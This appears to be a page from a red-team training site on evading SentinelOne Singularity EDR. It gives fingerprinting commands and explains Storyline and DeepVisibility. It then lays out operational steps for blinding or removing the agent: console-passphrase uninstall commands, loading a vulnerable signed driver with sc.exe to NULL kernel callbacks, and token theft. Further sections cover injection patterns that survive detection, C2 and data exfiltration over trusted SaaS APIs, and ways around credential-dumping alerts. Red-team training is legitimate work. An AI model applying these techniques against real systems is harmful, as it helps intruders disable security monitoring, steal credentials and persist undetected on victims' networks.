---
layout: training-page
title: "SentinelOne Singularity Evasion Tradecraft — Red Team Academy"
module: "Evasion"
tags:
  - sentinelone
  - singularity
  - edr-evasion
  - deep-visibility
  - storyline
  - behavioral-ai
  - kernel-callbacks
page_key: "evasion-sentinelone-tradecraft"
render_with_liquid: false
---

# SentinelOne Singularity Evasion Tradecraft

SentinelOne Singularity is the third leg of the major EDR triangle (CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne) and it behaves materially differently from the other two. Where Falcon leans on cloud-side analytics and MDE on Microsoft's stack-wide telemetry, S1's detection is autonomous and on-agent — a Static AI model classifies files pre-execution and a Behavioral AI model watches process behavior in real time without a cloud round-trip. The agent keeps detecting when offline, when egress is blocked, and when the operator thinks they've severed the EDR from its mothership — none of those tactics buy anything against S1.

The two features that change the operator's job more than anything else are **Storyline** (correlation engine that ties every action into a single graph keyed by a GUID, surviving process termination and agent restart) and **DeepVisibility** (a full event store where threat hunters can query historical process trees days or weeks later). Together they mean a "clean" follow-up action is not actually clean — it inherits the Storyline of whatever spawned it, and the SOC can pivot off that GUID at any point in the future.

This page covers the S1 sensor architecture, how to fingerprint it on a target, what S1 catches well versus poorly, and the evasion patterns that still survive in 2024–2025 engagements.

![SentinelOne Singularity architecture — Static AI, Behavioral AI, Storyline correlation, and DeepVisibility event store with operator pivot points](/images/evasion/sentinelone-architecture.svg)
*// sentinelone — autonomous on-agent detection with Storyline correlation*

## Singularity Architecture — On-Agent Detection by Design

The S1 sensor splits across user-mode services, a kernel driver, and ML models loaded at install time. Unlike Falcon, the heavy detection logic lives on the endpoint — killing network egress disables management and reporting, not detection.

```
# Components:
# SentinelAgent.exe           — primary user-mode agent (Static AI + Behavioral AI host,
#                                builds Storyline graph, talks to driver)
# SentinelMonitor.sys         — kernel driver
#   PsSetCreateProcessNotifyRoutineEx (process creation)
#   PsSetLoadImageNotifyRoutine       (module load)
#   ObRegisterCallbacks               (handle operations on protected procs)
#   File-system minifilter            (file telemetry)
#   CmRegisterCallbackEx              (registry callbacks)
# SentinelHelperService.exe   — privileged helper (frequent target for token-steal)
# SentinelStaticEngine.exe    — Static AI engine host (file classifier, ML-based)
# LogProcessorService.exe     — local event log forwarding to DeepVisibility

# Detection layers (outside-in):
# Layer 1: Static AI (pre-exec)       — file ML classification at write/exec, bundled (no cloud)
# Layer 2: Behavioral AI (in-exec)    — live process-behavior model, threshold kill/mitigate
# Layer 3: DeepVisibility (telemetry) — full event store, post-fact hunt for days/weeks
# Layer 4: Storyline (correlation)    — GUID per event, propagates through children + IPC,
#                                       one rule trip = entire Storyline flagged
```

## Fingerprinting SentinelOne on the Box

Confirm S1 is what you're dealing with before you touch anything. Misidentifying the EDR is the #1 reason operators burn — every vendor has different blind spots and your evasion choices depend on which agent is actually deployed.

```
># Services (any one = S1 deployed):
Get-Service | Where-Object { $_.Name -like "Sentinel*" -or $_.Name -like "LogProcessor*" }
# Expected: SentinelAgent, SentinelHelperService, SentinelStaticEngine, LogProcessorService

# Drivers loaded:
driverquery /v | findstr /i "Sentinel"
# Expected: SentinelMonitor.sys, SentinelDeviceControl.sys

# Installation path (version embedded — useful for vuln research):
dir "C:\Program Files\SentinelOne\"
# Format: "Sentinel Agent x.y.z.w"  e.g.,  "Sentinel Agent 23.4.2.13"

# Registry — agent config and console binding:
reg query "HKLM\SOFTWARE\Sentinel Labs" /s
reg query "HKLM\SOFTWARE\Sentinel Labs\Sentinel Agent\config" /v Site
reg query "HKLM\SOFTWARE\Sentinel Labs\Sentinel Agent\config" /v MgmtAddr
reg query "HKLM\SOFTWARE\Sentinel Labs\Sentinel Agent\config" /v AgentUuid

# MgmtAddr reveals the console URL — usually <customer>.sentinelone.net

# PowerShell one-liner — quick presence check:
if (Get-Service SentinelAgent -ErrorAction SilentlyContinue) { "S1 PRESENT" } else { "NOT FOUND" }

# Process list:
Get-Process | Where-Object { $_.ProcessName -like "Sentinel*" -or $_.ProcessName -like "LogProcessor*" } | ft Name, Id, Path

# Tools for automated EDR fingerprinting:
# SharpEDRChecker             — github.com/PwnDexter/SharpEDRChecker
# Invoke-EDRChecker           — github.com/PwnDexter/Invoke-EDRChecker
# RealBlindingEDR             — community S1-aware checker
```

## Storyline — The Real Reason S1 Is Hard

If you remember nothing else about S1, remember this: **every action on a S1-monitored endpoint gets tagged with a Storyline GUID, and that GUID propagates forward and is permanent**. This is what makes S1 detection asymmetric — even if your initial loader was clean, every subsequent action belongs to the same Storyline as the suspicious one upstream.

```
# How Storyline works:
# 1. SentinelMonitor.sys captures process creation
# 2. Each new process gets a Storyline GUID
#    - If the parent has a GUID, the child inherits it
#    - If no parent in tree, a new GUID is created
# 3. The GUID propagates across IPC:
#    - Named pipes / shared memory / COM/RPC / file handle reuse
# 4. Process termination does NOT drop the GUID — Storyline persists
# 5. ANY rule trigger anywhere in the Storyline → entire Storyline alerted

# Operational implications:
# (a) A "clean" follow-up after a noisy initial access does not break the link
# (b) Killing your process and restarting fresh does NOT break the Storyline —
#     parent chain is already correlated in the agent's local state
# (c) Sleeping won't help once the Storyline is tagged
# (d) Hunt queries by Storyline GUID surface everything in that tree later

# Practical mitigation:
#   - Minimize the surface that creates the FIRST flagged event
#   - Don't be noisy during initial access
#   - Don't use detected tools then "clean up"
#   - Once a Storyline is dirty, walk away — don't salvage under that tree

# DeepVisibility hunt syntax:
#   src.process.storyline.id = "ABC123..." | group by src.process.name
```

## What S1 Catches Well

S1's autonomous on-agent model means detection fires instantly without cloud confirmation. The items below trigger immediately even with no network connectivity.

```
# 1. Mimikatz binary detection (Static AI) — instant on write or memory load
#    Even Mimikatz-derived tools with default strings get flagged
#    Workaround: heavy source-level modification + recompilation, or write from scratch

# 2. LSASS handle open from non-system caller (Behavioral AI)
#    OpenProcess(PROCESS_VM_READ, lsass) from non-NT-SYSTEM = immediate alert
#    Workaround: snapshot APIs (PssCaptureSnapshot), parse offline, or use SAM/SYSTEM hives

# 3. Suspicious parent/child chains:
#    Office → wscript/cscript/powershell/cmd       (macro spawning script host)
#    winword.exe → rundll32.exe                    (Office DLL execution)
#    mshta.exe → powershell.exe                    (HTA chain)
#    excel.exe → certutil.exe                      (LOLBin download)

# 4. LOLBin chains hitting Storyline correlation:
#    rundll32 + comsvcs.dll + MiniDump → LSASS access
#    regsvr32 + scrobj.dll + remote URL → script-from-COM
#    msbuild + inline XML + C# compilation → behaviors stacked

# 5. Encoded PowerShell — -EncodedCommand + base64 = flagged
#    Static AI catches moderate obfuscation; Behavioral AI catches AMSI bypass patterns

# 6. Default tool artifacts:
#    Default named pipes (\\.\pipe\msagent_*, \\.\pipe\postex_*)
#    Default Cobalt Strike sleep/jitter timing patterns
#    Default Brute Ratel beacon behavior

# 7. Registry persistence patterns (Run keys, IFEO hijack, AppInit_DLLs)
# 8. WMI event consumer persistence (__EventFilter + __EventConsumer)
```

## What S1 Catches Less Well

These are the gaps you build operations around. S1 is autonomous but it's still a model — and like every model, it has blind spots in its training distribution.

```
# 1. Unhooked NTDLL in a process whose image is signed
#    Signed-image heuristic biases Behavioral AI toward "clean"
#    Re-map ntdll from disk in a notepad/calc-class host = much lower signal

# 2. Custom syscalls from a process on the allow-list
#    SysWhispers3 / Hell's Gate / Halo's Gate stubs in legitimate-signed context
#    Indirect syscalls (return address in ntdll.dll) further reduce signal

# 3. BYOVD where the vulnerable driver is not on S1's hash deny-list
#    S1's deny-list is not exhaustive — less-publicized LOLDrivers load cleanly
#    Once loaded with kernel R/W, you can NULL S1's callbacks (blinds without killing)

# 4. In-memory data exchange to legitimate cloud destinations
#    C2 over Graph API / Slack / Discord / Dropbox / GitHub
#    Destination trusted, process trusted, payload encrypted — DV logs but no rule fires

# 5. Process hollowing into a signed binary already running
#    Hollow into long-running explorer.exe / svchost.exe via NtMapViewOfSection
#    Avoid VirtualAllocEx + WriteProcessMemory + SetThreadContext default pattern

# 6. Thread name spoofing + indirect syscalls + stack spoofing combined
#    SetThreadDescription + SysWhispers3 + ThreadStackSpoofer = current best-in-class

# 7. Activity entirely inside an already-trusted process tree
#    Piggyback on a developer's PowerShell or sysadmin's terminal session
#    "Living as the user" is far harder for the model to score than fresh trees

# 8. Activity initiated with no obvious parent chain
#    Scheduled Task trigger (parent = svchost / Task Scheduler)
#    WMI event consumer trigger (parent = WmiPrvSE.exe)
#    Boot persistence (parent = wininit.exe / services.exe)
```

## Disabling / Crippling SentinelOne

You generally do not "kill" S1 the way you'd tamper with a less hardened EDR. The agent has anti-tamper protection, the driver is kernel-hardened, and modern versions require deliberate kernel-level attacks to remove. Approaches below ordered cleanest to noisiest.

### Privileged Removal Token (the supported method)

```
# Every agent has a Site Token + console-issued removal passphrase.
# An operator with valid console creds can:
#   1. Find the agent in the console
#   2. Generate Passphrase → produces a passphrase tied to AgentUuid
#   3. On target:
#        sentinelctl.exe unprotect -k <passphrase>
#        sentinelctl.exe unload all
#        sentinelctl.exe uninstall

# This is a SUPPORTED uninstall — no real-time alerts unless audit log review catches it
# Implication: compromise the S1 console = legitimate uninstall on every endpoint

# Console authentication paths to target:
#   - SSO / SAML / OIDC IdP — if SSO'd, owning IdP = owning S1
#   - API tokens in CI/CD or admin password managers
#   - Helpdesk admins with "Generate Uninstall Passphrase" privilege

# Detection: console audit log records passphrase generation + uninstall
# If the attacker owns the console, the audit log is owned too
```

### Anti-Tamper Bypass

```
# Anti-Tamper protects:
#   SentinelAgent.exe / SentinelMonitor.sys / SentinelHelperService.exe
#   HKLM\SOFTWARE\Sentinel Labs registry tree

# Pre-2023 attacks (patched, but you'll still see them in older deployments):
#   - ProcessHacker driver (KProcessHacker) + manual kernel callback removal
#   - PPL bypass via mhyprot2.sys → kill SentinelAgent
#   - sc.exe sdset on SentinelAgent service → permission modification

# 2023+ requirement: kernel-level write primitive (BYOVD)
# Without kernel write, you cannot meaningfully tamper with modern S1
```

### BYOVD against SentinelMonitor.sys

```
# Goal: load a vulnerable signed driver, get kernel R/W, then:
#   (a) NULL S1's kernel callbacks  → blinds the agent
#   (b) Patch PS_PROTECTION on SentinelAgent.exe → remove PPL
#   (c) Force-unload SentinelMonitor.sys

# Step 1 — Choose a driver NOT on S1's hash deny-list (loldrivers.io)
# Historically successful against S1:
#   RTCore64.sys (MSI Afterburner)        — arbitrary kernel R/W
#   gdrv.sys (GIGABYTE)                   — arbitrary kernel R/W
#   procexp152.sys (Sysinternals)         — handle ops on protected processes
#   mhyprot2.sys (Genshin Impact)         — kernel process termination
#   dbutil_2_3.sys (Dell)                 — kernel R/W

# Step 2 — Load (requires admin):
sc create vulndrv type= kernel start= demand binPath= C:\Windows\Temp\rtcore64.sys
sc start vulndrv

# Step 3 — NULL the callback arrays via tooling:
# EDRSandblast     — github.com/wavestone-cdt/EDRSandblast
# RealBlindingEDR  — github.com/myzxcg/RealBlindingEDR
# EDRKillShifter   — public PoC, used in real intrusions 2024

# Callback arrays NULLed:
#   PspCreateProcessNotifyRoutine  — process creation
#   PspCreateThreadNotifyRoutine   — thread creation
#   PspLoadImageNotifyRoutine      — DLL/image load
#   ObProcessCallbacks             — process handle requests
#   ObThreadCallbacks              — thread handle requests
#   CmCallbacks                    — registry callbacks
#   FsRtl minifilter callbacks     — file system callbacks

# After successful removal:
#   Agent alive but blind — DeepVisibility events stop
#   Static AI still scans (user-mode, not callback-based)
#   Storyline correlation continues for already-collected events

# Detection: sudden gap in DV telemetry from a host = obvious indicator
# Mature SOCs alert on "agent went silent"
```

### Service Termination via Token Steal

```
# Become NT AUTHORITY\SYSTEM via TrustedInstaller, then attempt privileged ops
# TrustedInstaller-token-spoof:
#   1. sc start TrustedInstaller
#   2. OpenProcess on TrustedInstaller process
#   3. OpenProcessToken (TOKEN_DUPLICATE) + DuplicateTokenEx
#   4. CreateProcessWithTokenW

# Tools: nsudo.exe, RunAsTI.exe (github.com/Mag1cByt3s/RunAsTI), SharpTokenSpoof

# Even as TrustedInstaller against modern S1:
#   SentinelAgent.exe cannot be terminated (PPL-AM + anti-tamper)
#   SentinelMonitor.sys cannot be unloaded (kernel anti-tamper)

# TI buys you almost nothing against modern S1 specifically
# Reserve TI for Defender, log clearing, restricted scheduled tasks
```

## Process Injection Patterns and S1 Fate

The injection technique you choose against S1 matters more than against most other EDRs because Behavioral AI scores the API call sequence holistically — it's looking for patterns, not individual calls.

| Technique | S1 Detection | Survival Approach |
|-----------|--------------|-------------------|
| CreateRemoteThread + LoadLibrary | HARD CATCH | Don't use this in 2024+ — flagged by every EDR |
| Process Hollowing into unsigned host | HARD CATCH | Image mismatch + suspicious parent flagged immediately |
| Process Hollowing into signed host (e.g., explorer.exe) | PARTIAL | Survives if combined with indirect syscalls + stack spoofing |
| Module stomping | PARTIAL | VAD shows legit-backed memory; pair with sleep encryption |
| APC injection (queued user APC) | PARTIAL | NtQueueApcThread + alertable wait — lower signal than CRT |
| Early Bird APC (CREATE_SUSPENDED + APC) | PARTIAL | Survives if EDR callbacks haven't fully initialized in target |
| Thread name spoofing + indirect syscalls + stack spoof | VIABLE | Current best-in-class pattern |
| Process Doppelganging (TxF) | VIABLE | Niche — Behavioral AI not trained heavily on this |
| Process Ghosting (delete-pending + section map) | VIABLE | Very low signal — no file on disk by exec time |
| NtMapViewOfSection cross-process | PARTIAL | Better than VirtualAllocEx but still leaves a signal |

```
# 2024–2025 reference pattern for surviving S1 with injection:
# 1. Indirect syscalls (SysWhispers3)         — return addr in ntdll
# 2. Target signed, long-running, allow-listed host (explorer.exe canonical)
# 3. Map via NtMapViewOfSection, not VirtualAllocEx
# 4. SetThreadDescription to a legitimate-looking name
# 5. Stack spoofing (ThreadStackSpoofer / SilentMoonwalk) during sleeps
# 6. Sleep masking + heap encryption (Ekko, Foliage, Cronos)
```

## DeepVisibility Blind Spots

DeepVisibility is the SOC's hunt surface. It records nearly everything but not everything equally well. Knowing what doesn't land in DV is the difference between an op that survives review and one pivoted on six weeks later.

```
# DV records well:
#   Process creation (full cmdline, parent PID, hash, signer)
#   Module loads, file writes, registry mods, netconns
#   Cross-process ops (OpenProcess, WriteProcessMemory)
#   Named pipes, scheduled tasks, service install/start/stop

# DV records POORLY or NOT AT ALL:

# 1. Encrypted in-memory data — beacon mask shows opaque pages, no content

# 2. Activity inside an already-trusted process tree
#    Piggyback on developer's PowerShell session → events recorded, scoring is lower

# 3. Data exfil via legitimate cloud APIs
#    HTTPS POST to graph.microsoft.com from Office process = normal
#    HTTPS POST to slack/discord/dropbox from user's client = normal
#    DV logs netconn, no rule fires

# 4. Activity with no parent-chain signature
#    Scheduled Task (parent = TaskScheduler / svchost)
#    WMI EventConsumer (parent = WmiPrvSE.exe)
#    Boot persistence (parent = wininit / services)

# 5. Activity below the kernel callback layer
#    After successful BYOVD callback NULL, DV gets gaps in the timeline
#    Mature SOCs catch "agent went silent" — less mature ones see a literal blind spot

# 6. Volume Shadow Copy operations — buried in legitimate backup noise
#    Useful for SAM/SECURITY hive extraction with lower scrutiny
```

## C2 OPSEC for S1 Environments

Storyline correlation forces a different C2 mindset than against Falcon or MDE. Infrastructure burns are forward-burns: anything tagged in a flagged Storyline is permanently associated with your activity, and future actions touching that Storyline are scored against the dirty context.

```
# 1. Assume Storyline-tagged ops are over — walk away fresh
#    If initial Storyline is flagged, burn redirector + implant + loader, restart
#    Salvage attempts almost always make it worse

# 2. HTTPS profile must NOT contain default tool signatures
#    Cobalt Strike / Mythic / Brute Ratel default Malleable profiles are fingerprinted
#    Use heavily customized profiles or write from scratch

# 3. Sleep + masking matters more here than against Falcon
#    S1 does periodic memory scans (Behavioral AI). Sleep mask is mandatory not optional
#    Ekko / Foliage / Cronos sleep obfuscation

# 4. Use trusted SaaS channels — domain fronting is largely dead
#    graph.microsoft.com  (custom OAuth app, low scrutiny)
#    api.github.com       (GitHub-as-C2)
#    api.dropboxapi.com   (file-based C2)
#    Blends into normal user traffic, not on most blocklists

# 5. Customize beacon names and named-pipe IPC
#    Default \\.\pipe\msagent_* and \\.\pipe\postex_* are detected
#    Use pipe names that match legitimate process patterns

# 6. Initial-access traffic must look like surrounding noise
#    Cloudflare / CloudFront / Fastly redirectors with categorized domains
#    Avoid known-bad TLDs and bare IPs

# 7. Time your callbacks
#    Jitter mandatory — no 60-second fixed beacons
#    Long sleep (4+ hr) evades volume detection
#    Active windows overlap normal business hours
```

## Behavioral AI Patterns to Avoid

Behavioral AI is a model trained on specific sequences. The patterns below are well-represented in S1's training data and will score high regardless of the specific commands.

```
# 1. Cobalt Strike default spawn sequence:
#    parent → cmd.exe → powershell.exe -nop -w hidden -enc <base64>
#    Pattern detected even with custom base64

# 2. Brute Ratel default behavior:
#    badger.exe → spawn-to default (notepad / runtimebroker)
#    Detected via indirect-syscall stub matching even with custom spawn-to

# 3. Credential access ordering:
#    OpenProcess(lsass) → ReadProcessMemory loop → file write of dump
#    Each step alone low-signal; the sequence is detected

# 4. Lateral movement:
#    powershell → Invoke-Command → remote endpoint
#    + within 60s, remote spawns powershell — network + process correlation

# 5. WMI event consumer + named pipe correlation
#    __EventFilter + __EventConsumer + tied named pipe activity = Storyline link

# 6. Kerberos abuse:
#    powershell/cmd spawning followed by ticket requests from procs that don't normally ask

# Avoidance principles:
#   - Don't reproduce default tool behavior chains
#   - Add jitter and benign actions between suspicious steps
#   - Spread credential access across sessions and time
#   - Use parents with legitimate reason for the child action
```

## Detection Signals to Expect

When something gets caught, S1 surfaces it through these alert types. Knowing what the SOC sees helps reason about what your actions look like from the defender's side.

```
# 1. Static AI hits (pre-exec)        — Critical/High, Quarantine (or Kill if running)
# 2. Behavioral AI threats (in-exec)  — Critical/High/Medium, Kill + Quarantine + optional containment
# 3. DeepVisibility custom rule hits  — org-specific hunt queries promoted to rules, alert-only
# 4. Storyline correlation alerts     — multiple low-sev events aggregate into a parent alert
#                                       (the "tell" that S1 has tied your activity together)
# 5. Anti-tamper alerts               — termination / protected-reg / driver-unload attempts
#                                       Critical, cannot be silenced locally, queued if offline
# 6. Application Control violations   — block on non-allow-listed paths (if enabled)
# 7. Device Control violations        — USB / removable media block (if enabled)
```

## Tools and Research

Public research and tooling for SentinelOne tradecraft. The S1-specific landscape is smaller than the Falcon or MDE community body, but techniques that work tend to work for a long time because they target structural properties of how S1 is built rather than specific signature gaps.

```
# Tooling:
#   SharpEDRChecker      — EDR fingerprinting on a target
#   EDRSandblast         — automated kernel callback removal (S1-aware targets)
#   RealBlindingEDR      — community S1-aware BYOVD blinder
#   LOLDrivers.io        — vulnerable signed driver database
#   SysWhispers3         — indirect syscall stub generator
#   ThreadStackSpoofer   — call stack spoofing during sleep
#   Ekko / Foliage       — sleep mask + memory encryption
#   SilentMoonwalk       — advanced stack spoofing

# Research (high-signal sources):
#   Adam Chester (xpn / SpecterOps / MDSec) — S1 internals, anti-tamper, callbacks
#   MDSec Research                          — EDR tradecraft including S1 specifics
#   SpecterOps blog                         — detection engineering reveals
#   Outflank                                — cross-vendor offensive research
#   BlackHat / DEF CON archives             — search "SentinelOne" / "Storyline"
#   Tier Zero Security                      — practical operator-perspective notes
```

## Resources

- SentinelOne Storyline overview — `sentinelone.com/blog/feature-spotlight-introducing-the-new-singularity-storyline/`
- SentinelOne Singularity architecture — `sentinelone.com/platform/singularity-xdr/`
- Adam Chester research blog — `blog.xpnsec.com/`
- MDSec research — `mdsec.co.uk/category/blog/`
- SpecterOps blog — `specterops.io/blog/`
- LOLDrivers database — `loldrivers.io`
- EDRSandblast — `github.com/wavestone-cdt/EDRSandblast`
- RealBlindingEDR — `github.com/myzxcg/RealBlindingEDR`
- SysWhispers3 — `github.com/klezVirus/SysWhispers3`
- SharpEDRChecker — `github.com/PwnDexter/SharpEDRChecker`
- ThreadStackSpoofer — `github.com/mgeeky/ThreadStackSpoofer`
- SilentMoonwalk — `github.com/klezVirus/SilentMoonwalk`
